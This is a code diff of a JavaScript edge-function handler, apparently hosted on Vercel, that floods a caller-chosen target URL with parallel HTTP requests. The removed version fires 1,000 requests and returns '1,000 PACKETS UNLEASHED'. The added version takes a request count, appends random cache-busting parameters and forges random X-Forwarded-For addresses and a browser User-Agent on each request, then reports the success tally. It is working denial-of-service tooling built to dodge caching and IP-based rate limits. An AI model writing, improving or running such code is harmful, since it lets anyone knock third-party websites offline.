@@ -1,13 +1,31 @@
 export const config = { runtime: 'edge' };
-export default async function handler(req) {
-  const { searchParams } = new URL(req.url);
-  const target = searchParams.get('target');
-  if (!target) return new Response("TARGET_MISSING", { status: 400 });
 
-  // Vercel 인프라를 이용해 1,000발 동시 발사
-  const attack = Array.from({ length: 1000 }).map(() =>
-    fetch(target, { mode: 'no-cors' }).catch(() => {})
-  );
-  await Promise.all(attack);
-  return new Response("1,000 PACKETS UNLEASHED");
+export default async function handler(req) {
+    const url = new URL(req.url);
+    const target = url.searchParams.get('target');
+    const count = parseInt(url.searchParams.get('count') || '100');
+    
+    if (!target) {
+        return new Response("Missing target", { status: 400 });
+    }
+    
+    // 병렬 요청
+    const promises = [];
+    for (let i = 0; i < count; i++) {
+        const randUrl = target + (target.includes('?') ? '&' : '?') + '_=' + Math.random() + Date.now();
+        promises.push(
+            fetch(randUrl, {
+                headers: {
+                    'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                },
+                cache: 'no-store'
+            }).catch(() => null)
+        );
+    }
+    
+    const results = await Promise.allSettled(promises);
+    const success = results.filter(r => r.status === 'fulfilled' && r.value?.ok !== false).length;
+    
+    return new Response(`✅ Sent ${count} requests to ${target}\n✅ Successful: ${success}\n✅ Failed: ${count - success}`);
 }
